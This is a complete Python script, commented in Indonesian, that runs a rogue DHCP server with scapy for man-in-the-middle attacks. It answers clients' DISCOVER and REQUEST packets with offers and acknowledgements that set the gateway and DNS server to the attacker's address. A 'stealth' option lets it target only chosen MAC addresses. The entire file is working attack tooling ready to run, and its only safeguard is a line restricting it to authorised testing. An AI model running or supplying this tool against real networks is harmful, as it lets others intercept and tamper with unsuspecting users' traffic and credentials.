#!/usr/bin/env python3
"""
DHCP Rogue Server for MITM Attack
[ROOT REQUIRED] Menyediakan DHCP server palsu untuk mengeksploitasi klien DHCP
dengan mengarahkan gateway dan DNS ke alamat IP penyerang.

Penggunaan:
    python dhcp_spoofer.py --iface eth0 --range 192.168.1.100-192.168.1.200
    python dhcp_spoofer.py --iface eth0 --gateway 192.168.1.99 --dns 192.168.1.99 --range 10.0.0.50-10.0.0.100
    python dhcp_spoofer.py --iface eth0 --range 192.168.1.100-192.168.1.200 --stealth 11:22:33:44:55:66

Peringatan: Hanya untuk pengujian keamanan yang sah. Penggunaan Rogue DHCP tanpa izin adalah ilegal.
"""

import argparse
import os
import signal
import socket
import struct
import sys
import time
from ipaddress import IPv4Network, IPv4Address
from threading import Event

try:
    from scapy.all import (
        Ether,
        IP,
        UDP,
        BOOTP,
        DHCP,
        get_if_addr,
        get_if_hwaddr,
        conf,
        sniff,
        sendp,
    )
except ImportError:
    sys.exit("[!] Scapy tidak terinstall. Install dengan: pip install scapy")

STOP_EVENT = Event()


def check_root():
    if os.name == "posix" and os.geteuid() != 0:
        sys.exit("[!] Tool ini memerlukan akses root. Jalankan dengan sudo.")


def signal_handler(sig, frame):
    print("\n[!] Menerima sinyal interrupt. Menghentikan DHCP spoofer...")
    STOP_EVENT.set()


def ip_to_int(ip: str) -> int:
    return struct.unpack("!I", socket.inet_aton(ip))[0]


def int_to_ip(val: int) -> str:
    return socket.inet_ntoa(struct.pack("!I", val))


def parse_ip_range(range_str: str) -> list[str]:
    if "-" in range_str:
        start, end = range_str.split("-")
        start_ip = ip_to_int(start.strip())
        end_ip = ip_to_int(end.strip())
        if end_ip < start_ip:
            sys.exit("[!] Range IP tidak valid: end < start")
        return [int_to_ip(i) for i in range(start_ip, end_ip + 1)]
    else:
        try:
            net = IPv4Network(range_str, strict=False)
            return [str(ip) for ip in net.hosts()]
        except ValueError:
            sys.exit(f"[!] Format range tidak valid: {range_str}")


class DHCPSpoofer:
    def __init__(
        self,
        iface: str,
        gateway: str,
        dns: str,
        ip_pool: list[str],
        lease_time: int,
        stealth_macs: list[str] | None,
    ):
        self.iface = iface
        self.gateway = gateway
        self.dns = dns
        self.ip_pool = ip_pool
        self.lease_time = lease_time
        self.stealth_macs = stealth_macs or []
        self.attacker_mac = get_if_hwaddr(iface)
        try:
            self.attacker_ip = get_if_addr(iface)
        except Exception:
            self.attacker_ip = gateway
        self.assigned = {}
        self.ip_index = 0
        self.clients_seen = set()
        self.offers_sent = 0
        self.requests_received = 0

    def get_next_ip(self, client_mac: str) -> str:
        if client_mac in self.assigned:
            return self.assigned[client_mac]
        if self.ip_index >= len(self.ip_pool):
            self.ip_index = 0
        ip = self.ip_pool[self.ip_index]
        self.assigned[client_mac] = ip
        self.ip_index += 1
        return ip

    def handle_dhcp_discover(self, pkt):
        if STOP_EVENT.is_set():
            return
        if not pkt.haslayer(DHCP):
            return
        dhcp_opts = dict([opt for opt in pkt[DHCP].options if isinstance(opt, tuple)])
        msg_type = dhcp_opts.get("message-type", 0)
        if msg_type != 1:
            return
        client_mac = pkt[Ether].src
        if self.stealth_macs and client_mac.lower() not in [m.lower() for m in self.stealth_macs]:
            return

        client_id = dhcp_opts.get(
            "client_id", client_mac.encode() if isinstance(client_mac, str) else b""
        )
        if isinstance(client_id, bytes):
            client_id = client_id.decode("utf-8", errors="replace")

        if client_mac not in self.clients_seen:
            self.clients_seen.add(client_mac)
            print(f"[*] DHCP DISCOVER terdeteksi dari {client_mac}")
            requested_hostname = dhcp_opts.get("hostname", b"")
            if isinstance(requested_hostname, bytes):
                requested_hostname = requested_hostname.decode("utf-8", errors="replace")
            if requested_hostname:
                print(f"    Hostname: {requested_hostname}")

        offered_ip = self.get_next_ip(client_mac)
        dhcp_offer = self._build_offer(pkt, offered_ip, client_mac)
        sendp(dhcp_offer, iface=self.iface, verbose=False)
        self.offers_sent += 1
        print(f"  [+] DHCP OFFER dikirim ke {client_mac} -> IP: {offered_ip}")

    def handle_dhcp_request(self, pkt):
        if STOP_EVENT.is_set():
            return
        if not pkt.haslayer(DHCP):
            return
        dhcp_opts = dict([opt for opt in pkt[DHCP].options if isinstance(opt, tuple)])
        msg_type = dhcp_opts.get("message-type", 0)
        if msg_type != 3:
            return
        client_mac = pkt[Ether].src
        if self.stealth_macs and client_mac.lower() not in [m.lower() for m in self.stealth_macs]:
            return

        requested_ip = dhcp_opts.get("requested_addr", "")
        self.requests_received += 1
        print(f"  [*] DHCP REQUEST dari {client_mac} untuk IP {requested_ip}")

        assigned_ip = requested_ip or self.get_next_ip(client_mac)
        self.assigned[client_mac] = assigned_ip
        dhcp_ack = self._build_ack(pkt, assigned_ip, client_mac)
        sendp(dhcp_ack, iface=self.iface, verbose=False)
        print(
            f"  [+] DHCP ACK dikirim ke {client_mac} -> IP: {assigned_ip} | GW: {self.gateway} | DNS: {self.dns}"
        )

    def _build_offer(self, discover_pkt, offered_ip: str, client_mac: str):
        dhcp_opts = [
            ("message-type", 2),
            ("server_id", self.attacker_ip),
            ("lease_time", self.lease_time),
            ("renewal_time", self.lease_time // 2),
            ("rebinding_time", int(self.lease_time * 0.875)),
            ("subnet_mask", "255.255.255.0"),
            ("router", self.gateway),
            ("name_server", self.dns),
            ("domain", "local"),
            ("broadcast_address", "255.255.255.255"),
            "end",
        ]

        eth = Ether(src=self.attacker_mac, dst=client_mac)
        ip = IP(src=self.attacker_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,
            yiaddr=offered_ip,
            siaddr=self.attacker_ip,
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=discover_pkt[BOOTP].xid,
        )
        dhcp = DHCP(options=dhcp_opts)
        return eth / ip / udp / bootp / dhcp

    def _build_ack(self, request_pkt, assigned_ip: str, client_mac: str):
        dhcp_opts = [
            ("message-type", 5),
            ("server_id", self.attacker_ip),
            ("lease_time", self.lease_time),
            ("renewal_time", self.lease_time // 2),
            ("rebinding_time", int(self.lease_time * 0.875)),
            ("subnet_mask", "255.255.255.0"),
            ("router", self.gateway),
            ("name_server", self.dns),
            ("domain", "local"),
            "end",
        ]

        eth = Ether(src=self.attacker_mac, dst=client_mac)
        ip = IP(src=self.attacker_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,
            yiaddr=assigned_ip,
            siaddr=self.attacker_ip,
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=request_pkt[BOOTP].xid,
        )
        dhcp = DHCP(options=dhcp_opts)
        return eth / ip / udp / bootp / dhcp


def main():
    parser = argparse.ArgumentParser(
        description="DHCP Rogue Server for MITM Attack [ROOT REQUIRED]",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh:
  python dhcp_spoofer.py --iface eth0 --range 192.168.1.100-192.168.1.200
  python dhcp_spoofer.py --iface eth0 --gateway 10.0.0.1 --dns 10.0.0.1 --range 10.0.0.50-10.0.0.100
  python dhcp_spoofer.py --iface eth0 --range 192.168.1.100-192.168.1.200 --stealth 11:22:33:44:55:66
        """,
    )
    parser.add_argument("--iface", required=True, help="Interface jaringan (contoh: eth0, wlan0)")
    parser.add_argument("--gateway", help="IP gateway yang akan diberikan (default: self IP)")
    parser.add_argument("--dns", help="IP DNS yang akan diberikan (default: self IP)")
    parser.add_argument(
        "--range",
        required=True,
        help="Pool IP (contoh: 192.168.1.100-192.168.1.200 atau 10.0.0.0/24)",
    )
    parser.add_argument(
        "--lease-time", type=int, default=86400, help="Waktu lease dalam detik (default: 86400)"
    )
    parser.add_argument(
        "--stealth",
        nargs="*",
        help="MAC address client untuk stealth mode (hanya respond ke MAC ini)",
    )
    parser.add_argument(
        "--timeout", type=int, default=0, help="Timeout dalam detik (0 = terus berjalan)"
    )
    args = parser.parse_args()

    print("=" * 55)
    print("  DHCP Rogue Server for MITM")
    print("  [ROOT REQUIRED]")
    print("=" * 55)

    check_root()
    signal.signal(signal.SIGINT, signal_handler)

    gateway = args.gateway or get_if_addr(args.iface)
    dns = args.dns or gateway

    ip_pool = parse_ip_range(args.range)
    print(f"[*] Pool IP: {len(ip_pool)} alamat ({ip_pool[0]} - {ip_pool[-1]})")
    print(f"[+] Gateway (attacker): {gateway}")
    print(f"[+] DNS (attacker): {dns}")
    print(f"[+] Interface: {args.iface}")
    print(f"[+] Lease time: {args.lease_time}s")

    if args.stealth:
        print(f"[*] Stealth mode: hanya respond ke {', '.join(args.stealth)}")
        for mac in args.stealth:
            print(f"    Target: {mac}")

    print("[!] Peringatan: Penggunaan Rogue DHCP hanya untuk pengujian yang sah!")
    print("[*] Menunggu DHCP DISCOVER... (Ctrl+C untuk berhenti)")
    time.sleep(0.5)

    spoofer = DHCPSpoofer(args.iface, gateway, dns, ip_pool, args.lease_time, args.stealth)

    sniff_filter = "udp and (port 67 or port 68)"
    start_time = time.time()

    try:
        while not STOP_EVENT.is_set():
            if args.timeout > 0 and (time.time() - start_time) > args.timeout:
                break
            pkts = sniff(filter=sniff_filter, iface=args.iface, count=1, timeout=1, store=False)
            for pkt in pkts:
                if pkt.haslayer(DHCP):
                    dhcp_opts = dict([opt for opt in pkt[DHCP].options if isinstance(opt, tuple)])
                    msg_type = dhcp_opts.get("message-type", 0)
                    if msg_type == 1:
                        spoofer.handle_dhcp_discover(pkt)
                    elif msg_type == 3:
                        spoofer.handle_dhcp_request(pkt)
    except KeyboardInterrupt:
        pass
    except PermissionError:
        sys.exit("[!] Izin ditolak. Jalankan sebagai root.")

    print(f"\n[+] Ringkasan:")
    print(f"    Klien terdeteksi: {len(spoofer.clients_seen)}")
    print(f"    OFFER dikirim: {spoofer.offers_sent}")
    print(f"    REQUEST diterima: {spoofer.requests_received}")
    print(f"    IP diberikan: {len(spoofer.assigned)}")
    for mac, ip in spoofer.assigned.items():
        print(f"      {mac} -> {ip}")
    print("[+] DHCP Spoofer dihentikan.")


if __name__ == "__main__":
    main()
